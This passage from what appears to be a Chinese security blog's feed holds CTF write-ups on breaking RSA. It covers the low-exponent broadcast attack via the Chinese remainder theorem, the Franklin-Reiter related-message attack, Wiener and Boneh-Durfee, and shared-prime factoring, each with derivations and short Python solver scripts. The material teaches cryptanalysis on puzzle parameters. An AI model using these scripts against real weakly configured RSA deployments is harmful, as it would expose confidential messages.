title="满足条件"></a>满足条件</h3><p>当有如下条件</p><script type="math/tex; mode=display">\begin{cases} C_1 \equiv m^{e} \text{ } mod \text{ } n_1\\C_2 \equiv m^{e} \text{ } mod \text{ } n_2 \\C_3 \equiv m^{e} \text{ } mod \text{ } n_3 \\C_4 \equiv m^{e} \text{ } mod \text{ } n_4 \\C_5 \equiv m^{e} \text{ } mod \text{ } n_5 \\....... \\C_{s} \equiv m^{e} \text{ } mod \text{ } n_{s}\end{cases}</script><p>我们有多组(c,n)，但是他们都是用同样的公钥加密同样的消息，且这里的公钥是一个低指数</p><h3 id="通解方法-2"><a href="#通解方法-2" class="headerlink" title="通解方法"></a>通解方法</h3><p>此时就可以使用中国剩余定理计算通解</p><script type="math/tex; mode=display">x=\sum_{i=1}^{n}a_it_iM_i \text{ } mod \text{ } M</script><p>其中</p><script type="math/tex; mode=display">M=m_1m_2m_3.....m_n \\M_i = M/m_i \\ M_it_i \equiv 1 \text{ } mod \text{ } m_i</script><p>详细链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2018/09/13/Crypto-RSA多等式攻击总结/#多等式之低加密指数广播攻击</span><br></pre></td></tr></table></figure></p><h3 id="计算脚本-2"><a href="#计算脚本-2" class="headerlink" title="计算脚本"></a>计算脚本</h3><p>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">question = [c1,c2,c3....n1,n2,n3...]</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">e=<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    N*=question[i][<span class="string">'n'</span>]</span><br><span class="line">N_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    N_list.append(N/question[i][<span class="string">'n'</span>])</span><br><span class="line">t_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    t_list.append(int(gmpy2.invert(N_list[i],question[i][<span class="string">'n'</span>])))</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    sum = (sum+question[i][<span class="string">'c'</span>]*t_list[i]*N_list[i])%N</span><br><span class="line">sum = gmpy.root(sum,e)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(sum)</span><br></pre></td></tr></table></figure></p><h2 id="Related-Message-Attack"><a href="#Related-Message-Attack" class="headerlink" title="Related Message Attack"></a>Related Message Attack</h2><h3 id="满足条件-3"><a href="#满足条件-3" class="headerlink" title="满足条件"></a>满足条件</h3><p>当e=3时,我们有如下条件</p><script type="math/tex; mode=display">c_1 \equiv (m+padding_1)^e \text{ }  mod \text{ } n \\c_2 \equiv (m+padding_2)^e \text{ }  mod \text{ } n</script><p>此时，我们有(c1,c2,n,padding)的值</p><h3 id="通解方法-3"><a href="#通解方法-3" class="headerlink" title="通解方法"></a>通解方法</h3><p>那么就可以使用此攻击，得到通解</p><script type="math/tex; mode=display">m \equiv \frac{\frac{3b(a^3c_2-b^3)}{c1-a^3c_2+2b^3}+b}{a}-padding2  \text{ } mod \text{ } n</script><p>详细推导过程见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2018/09/15/浅析RSA-Padding-Attack/</span><br></pre></td></tr></table></figure></p><h3 id="计算脚本-3"><a href="#计算脚本-3" class="headerlink" title="计算脚本"></a>计算脚本</h3><p>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span><span class="params">(a,b,c1,c2,n)</span>:</span></span><br><span class="line">    a3 = pow(a,<span class="number">3</span>,n)</span><br><span class="line">    b3 = pow(b,<span class="number">3</span>,n)</span><br><span class="line">    first = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = <span class="number">3</span>*b*(a3*c2-b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second*gmpy2.invert(first,n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third+b)*gmpy2.invert(a,n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line">m = getM2(a,b,c1,c2,n)-padding2</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure></p><h2 id="Winner’s-Attack"><a href="#Winner’s-Attack" class="headerlink" title="Winner’s Attack"></a>Winner’s Attack</h2><h3 id="满足条件-4"><a href="#满足条件-4" class="headerlink" title="满足条件"></a>满足条件</h3><p>当题目中</p><script type="math/tex; mode=display">d < \frac{1}{3}N^{\frac{1}{4}}</script><p>那么即可使用Winner’s Attack<br>更简单的判断方式为：e很大</p><h3 id="计算脚本-4"><a href="#计算脚本-4" class="headerlink" title="计算脚本"></a>计算脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pablocelayes/rsa-wiener-attack</span><br></pre></td></tr></table></figure><h2 id="Boneh-and-Durfee-attack"><a href="#Boneh-and-Durfee-attack" class="headerlink" title="Boneh and Durfee attack"></a>Boneh and Durfee attack</h2><h3 id="满足条件-5"><a href="#满足条件-5" class="headerlink" title="满足条件"></a>满足条件</h3><p>当题目中</p><script type="math/tex; mode=display">d \leq N^{0.292}</script><p>那么即可使用Boneh and Durfee attack<br>更简单的判断方式为：e很大，且Winner’s Attack无法使用</p><h3 id="计算脚本-5"><a href="#计算脚本-5" class="headerlink" title="计算脚本"></a>计算脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mimoo/RSA-and-LLL-attacks</span><br></pre></td></tr></table></figure><h3 id="与Winner’s-Attack对比"><a href="#与Winner’s-Attack对比" class="headerlink" title="与Winner’s Attack对比"></a>与Winner’s Attack对比</h3><p>Boneh and Durfee attack的条件需求比Winner’s Attack的需求低的多<br>所以一般情况下，在e很大的情况下，Winner’s Attack无法使用可以使用Boneh and Durfee attack</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;

&lt;figure class=&quot;highlight pla
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>浅析RSA Padding Attack</title>
    <link href="http://skysec.top/2018/09/15/%E6%B5%85%E6%9E%90RSA-Padding-Attack/"/>
    <id>http://skysec.top/2018/09/15/浅析RSA-Padding-Attack/</id>
    <published>2018-09-15T06:01:29.000Z</published>
    <updated>2018-10-06T03:28:38.646Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在安全客 https://www.anquanke.com/post/id/158944</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近日在复盘一些Crypto的题目，做到了N1CTF的一道rsapadding，进行了一些拓展，于是进行了一些分析记录，有了这篇文章</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目已开源在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/crypto/rsapadding</span><br></pre></td></tr></table></figure></p><p>主要代码为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">'*****************'</span></span><br><span class="line">n = <span class="number">21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118237091455770042750971424415176552479618605177552145594339271192853653120859740022742221562438237923294609436512995857399568803043924319953346241964071252941</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">welcom()</span><br><span class="line"><span class="keyword">if</span> cmd():</span><br><span class="line">    f = open(<span class="string">"/root/crypto/file.py"</span>)</span><br><span class="line">    print(f.read())</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">mm = bytes_to_long(m)</span><br><span class="line"><span class="keyword">assert</span> pow(mm, e) != pow(mm, e, n)</span><br><span class="line">sys.stdout.write(<span class="string">"Please give me a padding: "</span>)</span><br><span class="line">padding = input().strip()</span><br><span class="line">padding = int(sha256(padding.encode()).hexdigest(),<span class="number">16</span>)</span><br><span class="line">c = pow(mm+padding, e, n)</span><br><span class="line">print(<span class="string">"Your Ciphertext is: %s"</span>%c)</span><br></pre></td></tr></table></figure></p><p>意思很简单<br>1.pow(mm, e) != pow(mm, e, n)<br>2.输入一个值<br>3.将输入的值sha256，记做padding<br>4.利用rsa加密m+padding<br>值得注意的是，e=3，padding可控<br>那么我们拥有的条件只有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n,e,c,padding</span><br></pre></td></tr></table></figure></p><p>所以这里的攻击肯定是要从可控的padding入手了</p><h2 id="初步推导"><a href="#初步推导" class="headerlink" title="初步推导"></a>初步推导</h2><p>我们可以随便构造一对已知padding的密文，得到</p><script type="math/tex; mode=display">c_1 \equiv (m+padding_1)^3 \text{ }  mod \text{ } n \\c_2 \equiv (m+padding_2)^3 \text{ }  mod \text{ } n</script><p>此时，我们可以设</p><script type="math/tex; mode=display">M_1 = m+padding_1 \\M_2 =m+padding_2</script><p>利用这两个式子，我们可以得到如下线性关系</p><script type="math/tex; mode=display">M_1 = M_2-padding_2+padding_1</script><p>即方程形式为</p><script type="math/tex; mode=display">f(x) = ax+b</script><p>其中</p><script type="math/tex; mode=display">a=1 \\b=padding_1-padding_2</script><p>即</p><script type="math/tex; mode=display">M_1=f(M_2)</script><p>我们有</p><script type="math/tex; mode=display">c1 \equiv M_1^3 \text{ } mod \text{ } n \\c2 \equiv M_2^3 \text{ } mod \text{ } n \\</script><p>我们知道</p><script type="math/tex; mode=display">M_1 = aM_2+b</script><p>那么将其带入得到</p><script type="math/tex; mode=display">c1 \equiv (aM_2+b)^3 \text{ } mod \text{ } n \\c2 \equiv M_2^3 \text{ } mod \text{ } n \\</script><p>我们将c1展开得到</p><script type="math/tex; mode=display">(aM_2+b)^3 = a^3M_2^3+3(aM_2)^2b+3aM_2b^2+b^3</script><p>我们将这个式子带入得到</p><script type="math/tex; mode=display">c1 \equiv a^3M_2^3+3(aM_2)^2b+3aM_2b^2+b^3 \text{ } mod \text{ } n \\</script><p>于是便一筹莫展</p><h2 id="可求证明"><a href="#可求证明" class="headerlink" title="可求证明"></a>可求证明</h2><p>上述的推导我们漏了一个非常重要的信息</p><script type="math/tex; mode=display">f(x) = ax+b \\M_1=f(M_2) \\c1 \equiv M_1^e \text{ } mod \text{ } n</script><p>那么不难发现</p><script type="math/tex; mode=display">c1 \equiv f(x)^e \text{ } mod \text{ } n \\c1 \equiv f(M_2)^e \text{ } mod \text{ } n \\x=M_2</script><p>同理，我们还可以构造方程</p><script type="math/tex; mode=display">c2 \equiv x^e \text{ } mod \text{ } n \\c2 \equiv M_2^e \text{ } mod \text{ } n \\x=M_2</script><p>如此一来，我们可以得到</p><script type="math/tex; mode=display">x \equiv M_2 \text{ } mod \text{ } n</script><p>是下列方程组的一个解</p><script type="math/tex; mode=display">\begin{cases}f(x)=ax+b \\f(x)^e-c1 \equiv 0 \text{ } mod \text{ } n \\x^e-c2 \equiv 0 \text{ } mod \text{ } n \end{cases}</script><p>那么一定可以有</p><script type="math/tex; mode=display">s(x)=x^e-c2 \\t(x)=f(x)^e-c1</script><p>可以被写成</p><script type="math/tex; mode=display">s(x) \equiv (x-M_2)*k_1 \text{ } mod \text{ } n \\t(x) \equiv (x-M_2)*k_2 \text{ } mod \text{ } n \\k_1,k_2为多项式</script><p>如此一来，只要</p><script type="math/tex; mode=display">gcd(k_1,k_2)=1 \\则 \\gcd(s(x),t(x))=x-M_2 \\则 \\M_2 = x-gcd(s(x),t(x))</script><p>我们由e=3可以得知</p><script type="math/tex; mode=display">s(x)=x^3-c2 \\</script><p>只有唯一解，所以k1和k2必互素，所以这里是M2一定是可求的</p><h2 id="Related-Message-Attack"><a href="#Related-Message-Attack" class="headerlink" title="Related Message Attack"></a>Related Message Attack</h2><p>前面做了这么多证明铺垫，最后当然要祭出大招，即求解方法<br>这里的攻击是有方法名称的，即Related Message Attack<br>在e=3的情况下，我们可以利用rsa padding得到明文<br>根据之前第一步的推导，我们得到了</p><script type="math/tex; mode=display">c1 \equiv a^3M_2^3+3(aM_2)^2b+3aM_2b^2+b^3 \text{ } mod \text{ } n \\</script><p>我们将式子变形为</p><script type="math/tex; mode=display">c1 \equiv a^3M_2^3+3b(a^2M_2^2+aM_2b+b^2)-2b^3 \text{ } mod \text{ } n \\</script><p>移项得到</p><script type="math/tex; mode=display">c1-a^3M_2^3+2b^3 \equiv 3b(a^2M_2^2+aM_2b+b^2) \text{ } mod \text{ } n \\</script><p>根据立方差公式，我们又有</p><script type="math/tex; mode=display">(aM_2)^3-b^3 = (aM_2-b)(a^2M_2^2+aM_2b+b^2)</script><p>联立</p><script type="math/tex; mode=display">\begin{cases}c1-a^3M_2^3+2b^3 \equiv 3b(a^2M_2^2+aM_2b+b^2) \text{ } mod \text{ } n \\(aM_2)^3-b^3 \equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \text{ } mod \text{ } n \\ c_2 \equiv M_2^3  \text{ } mod \text{ } n \end{cases}</script><p>我们将式子1左右同乘<code>aM2-b</code>，将式子2左右同乘<code>3b</code><br>然后即可得到如下式子</p><script type="math/tex; mode=display">(c1-a^3M_2^3+2b^3)(aM_2-b) \equiv 3b((aM_2)^3-b^3) \text{ } mod \text{ } n  \\c_2 \equiv M_2^3  \text{ } mod \text{ } n</script><p>我们再把c2带入得到</p><script type="math/tex; mode=display">(c1-a^3c_2+2b^3)(aM_2-b) \equiv 3b(a^3c_2-b^3) \text{ } mod \text{ } n</script><p>则最后可以有</p><script type="math/tex; mode=display">aM_2-b \equiv  \frac{3b(a^3c_2-b^3)}{c1-a^3c_2+2b^3} \text{ } mod \text{ } n \\</script><p>即可求得M2<br>而我们知道</p><script type="math/tex; mode=display">M_2 = m+padding2 \\所以 \\m = M_2-padding2</script><p>所以最后有</p><script type="math/tex; mode=display">m \equiv \frac{\frac{3b(a^3c_2-b^3)}{c1-a^3c_2+2b^3}+b}{a}-padding2  \text{ } mod \text{ } n</script><p>注意，这里的分式不是除法，是逆元</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>既然推导出了公式，写脚本即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span><span class="params">(a,b,c1,c2,n)</span>:</span></span><br><span class="line">    a3 = pow(a,<span class="number">3</span>,n)</span><br><span class="line">    b3 = pow(b,<span class="number">3</span>,n)</span><br><span class="line">    first = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = <span class="number">3</span>*b*(a3*c2-b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second*gmpy2.invert(first,n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third+b)*gmpy2.invert(a,n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line">m = getM2(a,b,c1,c2,n)-padding2</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure></p><h2 id="Coppersmith’s-short-pad-attack"><a href="#Coppersmith’s-short-pad-attack" class="headerlink" title="Coppersmith’s short-pad attack"></a>Coppersmith’s short-pad attack</h2><p>上述情况是e=3时候，我们可以根据</p><script type="math/tex; mode=display">c_1 \equiv (m+padding_1)^3 \text{ }  mod \text{ } n \\c_2 \equiv (m+padding_2)^3 \text{ }  mod \text{ } n</script><p>推导出m<br>那么当e不是3的时候怎么办呢？<br>这里稍作拓展，我们可以用Coppersmith’s short-pad attack，即padding过短引起的攻击<br>脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/FranklinReiter.sage</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>根据这一次学习，不难发现在存在padding的情况下，rsa也存在各种风险：<br>1.若e=3，则可以利用Related Message Attack<br>2.若e不为3，但padding过短，则可以利用Coppersmith’s short-pad attack</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;

&lt;figure class=&quot;highlight pla
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>Crypto-RSA多等式攻击总结</title>
    <link href="http://skysec.top/2018/09/13/Crypto-RSA%E5%A4%9A%E7%AD%89%E5%BC%8F%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/"/>
    <id>http://skysec.top/2018/09/13/Crypto-RSA多等式攻击总结/</id>
    <published>2018-09-13T00:49:18.000Z</published>
    <updated>2018-10-06T03:28:36.764Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在安全客 https://www.anquanke.com/post/id/158614</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到一些RSA题目，里面不乏一些多等式的题目，在这里总结一下</p><h2 id="多等式之公约数（1）"><a href="#多等式之公约数（1）" class="headerlink" title="多等式之公约数（1）"></a>多等式之公约数（1）</h2><p>题目如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m = xxxxxxxx</span><br><span class="line">e = 65537</span><br><span class="line">========== n c ==========</span><br><span class="line">n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class="line">c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><span class="line"></span><br><span class="line">n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class="line">c = </span><br><span class="line">.........</span><br></pre></td></tr></table></figure></p><p>因为太多，我就不给全了，一共20组，每组一个c一个n<br>这是典型的多模数题目，即用同样的公钥加密同样的消息，只是私钥一直在变换<br>所以这就是一个简单的RSA共享素数攻击，在生成p和q的时候，难免会有2个n共享1个素数<br>所以我们用gcd遍历n，相应的脚本如下，即可分解出p和q<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line">f = open(<span class="string">'rsa.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">txt_content = f.readlines()[<span class="number">3</span>:]</span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt_content:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'n'</span> <span class="keyword">in</span> i:</span><br><span class="line">        n.append(int(i[<span class="number">4</span>:].replace(<span class="string">'\n'</span>,<span class="string">''</span>)))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'c'</span> <span class="keyword">in</span> i:</span><br><span class="line">        c.append(int(i[<span class="number">4</span>:].replace(<span class="string">'\n'</span>,<span class="string">''</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">19</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> primefac.gcd(n[i],n[j]) != <span class="number">1</span>:</span><br><span class="line">            now_n = n[i]</span><br><span class="line">            now_c = c[i]</span><br><span class="line">            p = primefac.gcd(n[i],n[j])</span><br><span class="line">            q = now_n/p</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)</span><br><span class="line">            <span class="keyword">print</span> libnum.n2s(pow(now_c,d,now_n))</span><br></pre></td></tr></table></figure></p><p>即可得到flag</p><h2 id="多等式之公约数（2）"><a href="#多等式之公约数（2）" class="headerlink" title="多等式之公约数（2）"></a>多等式之公约数（2）</h2><p>题目如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> size,bytes_to_long,getStrongPrime</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(<span class="string">"Your secret flag is : flag&#123;**************************&#125;"</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">pri = []</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'cipherx.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    pri.append(getStrongPrime(<span class="number">1024</span>,<span class="number">65537</span>))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> combinations(pri, <span class="number">2</span>):</span><br><span class="line">n = k[<span class="number">0</span>] * k[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> k[<span class="number">0</span>],k[<span class="number">1</span>]</span><br><span class="line">f.write(str(pow(msg, e, n)) + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure></p><p>题目的意思很清楚，即生成5个强素数<br>然后两两组合，生成10组不同的n<br>然后分别加密同一个消息，用同一个公钥<br>于是可以有下面的方程组</p><script type="math/tex; mode=display">\begin{cases} C_1 \equiv m^e \text{ } mod \text{ } p_1p_2 \\C_2 \equiv m^e \text{ } mod \text{ } p_1p_3 \\C_3 \equiv m^e \text{ } mod \text{ } p_1p_4 \\C_4 \equiv m^e \text{ } mod \text{ } p_1p_5 \\C_5 \equiv m^e \text{ } mod \text{ } p_2p_3 \\....... \\C_{10} \equiv m^e \text{ } mod \text{ } p_4p_5\end{cases}</script><p>这样的情况，我们显然需要数学推导<br>我们单独拿出下面3个式子做推导</p><script type="math/tex; mode=display">C_1 \equiv m^e \text{ } mod \text{ } p_1p_2 \\C_2 \equiv m^e \text{ } mod \text{ } p_1p_3 \\C_3 \equiv m^e \text{ } mod \text{ } p_1p_4</script><p>可以推导出</p><script type="math/tex; mode=display">C_1 = m^e+k_1p_1p_2 \\C_2 = m^e+k_2p_1p_3 \\C_3 = m^e+k_3p_1p_4 \\</script><p>其中k1,k2,k3为整数<br>我们式1，2相减，式2，3相减，得到</p><script type="math/tex; mode=display">C_1-C_2 = k_1p_1p_2 - k_2p_1p_3 \\C_2-C_3 = k_2p_1p_3 - k_3p_1p_4</script><p>我们进行因式分解，可以得到</p><script type="math/tex; mode=display">C_1-C_2 = p_1(k_1p_2 - k_2p_3) \\C_2-C_3 = p_1(k_2p_3 - k_3p_4)</script><p>于是乎，我们可以进行</p><script type="math/tex; mode=display">gcd(C_1-C_2,C_2-C_3)</script><p>这样得到的公约数极大可能为p1，若不是，再做后续简单分解即可<br>而这道题里，公约数即为p1<br>所以同理，我们利用</p><script type="math/tex; mode=display">C_5 = m^e+k_1p_2p_3 \\C_6 = m^e+k_2p_2p_4 \\C_7 = m^e+k_3p_2p_5 \\</script><p>同样可以求出p2<br>即</p><script type="math/tex; mode=display">gcd(C_5-C_6,C_6-C_7)</script><p>至此我们分解出了p1和p2<br>这即为第一组的p和q，利用其即可求出私钥解密得到消息<br>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c1 = ......</span><br><span class="line">c2 = ......</span><br><span class="line">c3 = ......</span><br><span class="line">c5 = ......</span><br><span class="line">c6 = ......</span><br><span class="line">c7 = ......</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">k1 = primefac.gcd(abs(c1-c2),abs(c2-c3))</span><br><span class="line">k2 = primefac.gcd(abs(c5-c6),abs(c6-c7))</span><br><span class="line">n = k1*k2</span><br><span class="line">phi = (k1<span 